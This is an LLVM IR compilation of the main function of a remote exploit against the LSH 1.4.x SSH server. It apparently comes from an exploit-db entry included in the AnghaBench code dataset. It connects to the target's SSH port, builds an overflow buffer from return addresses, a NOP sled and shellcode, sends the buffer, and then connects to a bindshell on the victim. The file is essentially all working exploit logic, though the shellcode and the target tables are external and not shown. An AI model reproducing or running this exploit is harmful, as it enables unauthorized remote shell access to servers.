; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23161.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23161.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }

@.str = private unnamed_addr constant [70 x i8] c"LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"t:T:h\00", align 1
@host = common dso_local global i8* null, align 8
@optarg = common dso_local global i32 0, align 4
@SIZ = common dso_local global i32 0, align 4
@useTarget = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@usage = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"Available platforms:\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [10 x i8] c" %2d. %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.6 = private unnamed_addr constant [46 x i8] c"[*] You must specify a host! Use -h for help\0A\00", align 1
@hostStruct = common dso_local global i32* null, align 8
@.str.7 = private unnamed_addr constant [51 x i8] c"[*] Couldn't resolve host %s\0AUse '%s -h' for help\0A\00", align 1
@SSH_PORT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [33 x i8] c"[*] Coulnd't connect to host %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"[-] Building exploit buffer...\0A\00", align 1
@buf = common dso_local global i64 0, align 8
@EXPLOIT_BUF_SIZE = common dso_local global i32 0, align 4
@NOPS_LEN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [31 x i8] c"[-] Sending exploit string...\0A\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"[-] Sleeping...\0A\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"[-] Connecting to bindshell...\0A\00", align 1
@.str.13 = private unnamed_addr constant [50 x i8] c"[*] Could not connect to %s - the exploit failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64*, align 8
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str, i64 0, i64 0))
  br label %12

12:                                               ; preds = %56, %2
  %13 = load i32, i32* %4, align 4
  %14 = load i8**, i8*** %5, align 8
  %15 = call i32 @getopt(i32 %13, i8** %14, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  store i32 %15, i32* %6, align 4
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %17, label %57

17:                                               ; preds = %12
  %18 = load i32, i32* %6, align 4
  switch i32 %18, label %29 [
    i32 116, label %19
    i32 84, label %25
    i32 104, label %28
  ]

19:                                               ; preds = %17
  %20 = load i8*, i8** @host, align 8
  %21 = load i32, i32* @optarg, align 4
  %22 = load i32, i32* @SIZ, align 4
  %23 = sub nsw i32 %22, 1
  %24 = call i32 @strncpy(i8* %20, i32 %21, i32 %23)
  br label %56

25:                                               ; preds = %17
  %26 = load i32, i32* @optarg, align 4
  %27 = call i64 @atoi(i32 %26)
  store i64 %27, i64* @useTarget, align 8
  br label %56

28:                                               ; preds = %17
  br label %29

29:                                               ; preds = %17, %28
  %30 = load i8*, i8** @usage, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8* %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %33

33:                                               ; preds = %50, %29
  %34 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i64 %36
  %38 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = icmp ne i8* %39, null
  br i1 %40, label %41, label %53

41:                                               ; preds = %33
  %42 = load i32, i32* %7, align 4
  %43 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %44 = load i32, i32* %7, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i64 %45
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %46, i32 0, i32 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 %42, i8* %48)
  br label %50

50:                                               ; preds = %41
  %51 = load i32, i32* %7, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %7, align 4
  br label %33

53:                                               ; preds = %33
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %55 = call i32 @exit(i32 0) #3
  unreachable

56:                                               ; preds = %25, %19
  br label %12

57:                                               ; preds = %12
  %58 = load i8*, i8** @host, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 0
  %60 = load i8, i8* %59, align 1
  %61 = sext i8 %60 to i32
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %66

63:                                               ; preds = %57
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.6, i64 0, i64 0))
  %65 = call i32 @exit(i32 1) #3
  unreachable

66:                                               ; preds = %57
  %67 = load i8*, i8** @host, align 8
  %68 = call i32* @gethostbyname(i8* %67)
  store i32* %68, i32** @hostStruct, align 8
  %69 = icmp eq i32* %68, null
  br i1 %69, label %70, label %77

70:                                               ; preds = %66
  %71 = load i8*, i8** @host, align 8
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0), i8* %71, i8* %74)
  %76 = call i32 @exit(i32 1) #3
  unreachable

77:                                               ; preds = %66
  %78 = load i32, i32* @SSH_PORT, align 4
  %79 = call i32 @connect_to_host(i32 %78)
  store i32 %79, i32* %8, align 4
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %85

81:                                               ; preds = %77
  %82 = load i8*, i8** @host, align 8
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0), i8* %82)
  %84 = call i32 @exit(i32 1) #3
  unreachable

85:                                               ; preds = %77
  %86 = load i32, i32* %8, align 4
  %87 = call i32 @my_recv(i32 %86)
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  %89 = load i64, i64* @buf, align 8
  %90 = inttoptr i64 %89 to i64*
  store i64* %90, i64** %9, align 8
  store i32 0, i32* %7, align 4
  br label %91

91:                                               ; preds = %105, %85
  %92 = load i32, i32* %7, align 4
  %93 = load i32, i32* @EXPLOIT_BUF_SIZE, align 4
  %94 = sdiv i32 %93, 4
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %108

96:                                               ; preds = %91
  %97 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %98 = load i64, i64* @useTarget, align 8
  %99 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %97, i64 %98
  %100 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %99, i32 0, i32 1
  %101 = load i32, i32* %100, align 8
  %102 = sext i32 %101 to i64
  %103 = load i64*, i64** %9, align 8
  %104 = getelementptr inbounds i64, i64* %103, i32 1
  store i64* %104, i64** %9, align 8
  store i64 %102, i64* %103, align 8
  br label %105

105:                                              ; preds = %96
  %106 = load i32, i32* %7, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %7, align 4
  br label %91

108:                                              ; preds = %91
  %109 = load i64*, i64** %9, align 8
  %110 = bitcast i64* %109 to i8*
  store i8* %110, i8** %10, align 8
  store i32 0, i32* %7, align 4
  br label %111

111:                                              ; preds = %121, %108
  %112 = load i32, i32* %7, align 4
  %113 = load i32, i32* @NOPS_LEN, align 4
  %114 = load i32, i32* @shellcode, align 4
  %115 = call i32 @strlen(i32 %114)
  %116 = sub nsw i32 %113, %115
  %117 = icmp slt i32 %112, %116
  br i1 %117, label %118, label %124

118:                                              ; preds = %111
  %119 = load i8*, i8** %10, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 1
  store i8* %120, i8** %10, align 8
  store i8 -112, i8* %119, align 1
  br label %121

121:                                              ; preds = %118
  %122 = load i32, i32* %7, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %7, align 4
  br label %111

124:                                              ; preds = %111
  %125 = load i8*, i8** %10, align 8
  %126 = load i32, i32* @shellcode, align 4
  %127 = load i32, i32* @shellcode, align 4
  %128 = call i32 @strlen(i32 %127)
  %129 = call i32 @memcpy(i8* %125, i32 %126, i32 %128)
  %130 = load i8*, i8** %10, align 8
  %131 = load i32, i32* @shellcode, align 4
  %132 = call i32 @strlen(i32 %131)
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %130, i64 %133
  store i8 10, i8* %134, align 1
  %135 = load i8*, i8** %10, align 8
  %136 = load i32, i32* @shellcode, align 4
  %137 = call i32 @strlen(i32 %136)
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %135, i64 %138
  %140 = getelementptr inbounds i8, i8* %139, i64 1
  store i8 0, i8* %140, align 1
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0))
  %142 = load i32, i32* %8, align 4
  %143 = load i64, i64* @buf, align 8
  %144 = call i32 @my_send(i32 %142, i64 %143)
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @close(i32 %145)
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %148 = call i32 @my_sleep(i32 100000)
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0))
  %150 = call i32 (...) @do_bind_shell()
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %152, label %155

152:                                              ; preds = %124
  %153 = load i8*, i8** @host, align 8
  %154 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.13, i64 0, i64 0), i8* %153)
  br label %155

155:                                              ; preds = %152, %124
  %156 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i64 @atoi(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32* @gethostbyname(i8*) #1

declare dso_local i32 @connect_to_host(i32) #1

declare dso_local i32 @my_recv(i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @my_send(i32, i64) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @my_sleep(i32) #1

declare dso_local i32 @do_bind_shell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
